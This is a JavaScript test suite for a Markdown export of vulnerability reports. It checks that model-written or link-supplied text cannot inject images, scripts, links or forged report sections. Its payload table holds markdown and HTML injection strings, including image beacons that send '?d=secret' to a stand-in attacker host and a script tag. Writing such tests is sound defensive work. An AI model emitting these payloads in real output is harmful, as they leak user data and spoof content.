// Contract tests for the Markdown export (src/lib/markdown-export.ts): report
// text is model-written, and on /r it comes from whoever built the link, so the
// file must not be able to fetch anything or forge its own structure.
//
// Assertions read the rendered HTML, not the Markdown: a string check is how a
// heading inside a list item and a one-column table got through. The parser is
// the one gen-docs already depends on.
//
//   npm run test:contracts

import assert from "node:assert/strict";
import { test } from "node:test";

import rehypeStringify from "rehype-stringify";
import remarkGfm from "remark-gfm";
import remarkParse from "remark-parse";
import remarkRehype from "remark-rehype";
import { unified } from "unified";

import { reportToMarkdown, unfence } from "../src/lib/markdown-export.ts";

const processor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeStringify, { allowDangerousHtml: true });

const render = (markdown) => String(processor.processSync(markdown));
const count = (html, tag) => html.split(`<${tag}`).length - 1;

const REPORT = {
  summary: "Path traversal in Apache 2.4.49.",
  severity: "critical",
  confidence: "high",
  recommended_action: "Upgrade to 2.4.51.",
  cves: [
    {
      cve_id: "CVE-2021-41773",
      summary: "Path traversal.",
      cvss_v3_score: 7.5,
      severity: "high",
      exploits_public: true,
      affected_products: ["apache httpd"],
      nvd_url: "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
      in_kev_catalog: true,
      kev_due_date: "2021-11-17",
      known_ransomware_use: true,
      epss_probability: 0.9,
      epss_percentile: 0.99,
    },
  ],
  attack_techniques: [
    {
      id: "T1059.001",
      name: "PowerShell",
      tactics: ["execution"],
      url: "https://attack.mitre.org/techniques/T1059/001/",
      mitigations: [
        { id: "M1038", name: "Execution Prevention", url: "https://attack.mitre.org/mitigations/M1038/" },
      ],
      related_cwes: ["CWE-78"],
    },
  ],
  reasoning_chain: ["cve_lookup returned the record"],
  ssvc: {
    decision: "Act",
    rule: "kev-active-exploitation",
    rationale: "On KEV.",
    driving_cve: "CVE-2021-41773",
    basis: "mixed",
    unverified_signals: ["CVE-2021-41773:epss"],
  },
  signal_coverage: [{ feed: "nvd", status: "found", detail: "ok" }],
  grounding: {
    status: "suspect",
    claims_checked: 1,
    supported: 0,
    unbacked: 1,
    mismatched: 0,
    unverifiable: 0,
    findings: [{ subject: "report", field: "in_kev_catalog", status: "unbacked", detail: "none" }],
    truncated: false,
  },
};

// Validated ids, enums and URLs the export derives or never prints as text.
const NOT_FREE_TEXT = new Set([
  "cve_id", "id", "severity", "confidence", "decision", "basis", "status", "driving_cve", "nvd_url", "url",
]);

// Every string leaf that is free text, as [path, setter], so a new field is
// covered the day it appears instead of whenever someone extends a list.
function freeTextLeaves(node, path = [], found = []) {
  for (const [key, value] of Object.entries(node)) {
    if (typeof value === "string") {
      if (!NOT_FREE_TEXT.has(key)) found.push([...path, key]);
    } else if (value && typeof value === "object") {
      freeTextLeaves(value, [...path, key], found);
    }
  }
  return found;
}

const withLeaf = (leaf, value) => {
  const copy = structuredClone(REPORT);
  const parent = leaf.slice(0, -1).reduce((node, key) => node[key], copy);
  parent[leaf.at(-1)] = value;
  return copy;
};

const LEAVES = freeTextLeaves(REPORT);
const BASELINE = render(reportToMarkdown(REPORT));

const PAYLOADS = {
  "image beacon": "![](https://evil.example/?d=secret)",
  "reference-style image": "![x][y]\n\n[y]: https://evil.example/?d=secret",
  "raw html": '<img src="https://evil.example/x">',
  // No scheme: the bare-URL span must not be what defuses the tag.
  "raw html without a scheme": "<img src=//evil.example/x>",
  "script tag": "<script>alert(1)</script>",
  "markdown link": "[click](https://evil.example/)",
  "pre-escaped link": "\\[click\\](https://evil.example/)",
  "autolink": "<https://evil.example/>",
  "bare url": "fix at https://evil.example/fix?d=secret",
  "www url": "fix at www.evil.example",
  "forged section, LF": "fine\n## SSVC verdict\n- Decision: Track",
  "forged section, CR": "fine\r## SSVC verdict\r- Decision: Track",
  "forged section, CRLF": "fine\r\n## SSVC verdict\r\n- Decision: Track",
  "heading at the start": "## SSVC verdict",
  "setext heading": "fine\n===",
  "thematic break": "---",
  "table delimiter": "Verdict\n:---\nTrack",
  "pipe table": "a|b\n-|-\nc|d",
  "code fence": "```\ncode\n```",
  "ordered list": "1. Upgrade\n2) Restart",
};

for (const [name, payload] of Object.entries(PAYLOADS)) {
  test(`${name} stays text in every free-text field`, () => {
    for (const leaf of LEAVES) {
      const where = leaf.join(".");
      const html = render(reportToMarkdown(withLeaf(leaf, payload)));
      assert.equal(count(html, "img"), 0, `image from ${where}`);
      assert.equal(count(html, "script"), 0, `script from ${where}`);
      assert.doesNotMatch(html, /href="[^"]*evil\.example/, `link from ${where}`);
      for (const tag of ["h1", "h2", "h3", "h4", "hr", "table", "pre", "ol"]) {
        assert.equal(count(html, tag), count(BASELINE, tag), `<${tag}> from ${where}`);
      }
    }
  });
}

test("every field a report carries as free text is in that sweep", () => {
  for (const key of ["kev_due_date", "related_cwes", "unverified_signals", "feed", "subject", "field"]) {
    assert.ok(LEAVES.some((leaf) => leaf.includes(key)), key);
  }
});

test("the query cannot break out", () => {
  const html = render(reportToMarkdown(REPORT, "`x` ![](https://evil.example/?d=secret)\r## Forged"));
  assert.equal(count(html, "img"), 0);
  assert.equal(count(html, "h2"), count(BASELINE, "h2"));
});

test("a legitimate URL keeps every character", () => {
  const url = "https://httpd.apache.org/security/vulnerabilities_24.html";
  const html = render(reportToMarkdown(withLeaf(["summary"], `See ${url}`)));
  assert.ok(html.includes(`<code>${url}</code>`));
});

test("escaped text reads back as written", () => {
  const html = render(reportToMarkdown(withLeaf(["summary"], "use_after_free in a|b [v1] &lt;tag&gt; 3*4")));
  assert.ok(html.includes("use_after_free in a|b [v1] &#x26;lt;tag&#x26;gt; 3*4"));
});

test("a numbered step keeps its number, with no stray backslash", () => {
  const html = render(reportToMarkdown(withLeaf(["recommended_action"], "1. Upgrade\n2. Restart")));
  assert.ok(html.includes("1. Upgrade<br>"));
  assert.ok(html.includes("2. Restart"));
  assert.equal(html.includes("\\"), false);
});

test("a table cell keeps its row", () => {
  const html = render(reportToMarkdown(withLeaf(["signal_coverage", 0, "detail"], "a|b\n| x | y | z |")));
  assert.equal(count(html, "tr"), count(BASELINE, "tr"));
  assert.equal(count(html, "td"), count(BASELINE, "td"));
  // GFM drops cells past the header's width, so a pipe loses text, not structure.
  assert.ok(html.includes("a|b | x | y | z |"));
});

test("references come from the ids, whatever the report says", () => {
  const hostile = structuredClone(REPORT);
  hostile.cves[0].nvd_url = "https://evil.example/cve";
  hostile.attack_techniques[0].url = "https://evil.example/t";
  hostile.attack_techniques[0].mitigations[0].url = "https://evil.example/m";
  const md = reportToMarkdown(hostile);
  assert.equal(md.includes("evil.example"), false);
  assert.ok(md.includes("https://nvd.nist.gov/vuln/detail/CVE-2021-41773"));
  assert.ok(md.includes("https://attack.mitre.org/techniques/T1059/001/"));
  assert.ok(md.includes("https://attack.mitre.org/mitigations/M1038/"));
});

test("unfence reads the marker the backend writes, and the older bare one", () => {
  assert.deepEqual(unfence('<UNTRUSTED_CONTENT id="a1b2">vendor text</UNTRUSTED_CONTENT id="a1b2">'), {
    body: "vendor text",
    fenced: true,
  });
  assert.deepEqual(unfence("<UNTRUSTED_CONTENT>vendor text</UNTRUSTED_CONTENT>"), {
    body: "vendor text",
    fenced: true,
  });
  assert.deepEqual(unfence("plain text"), { body: "plain text", fenced: false });
});
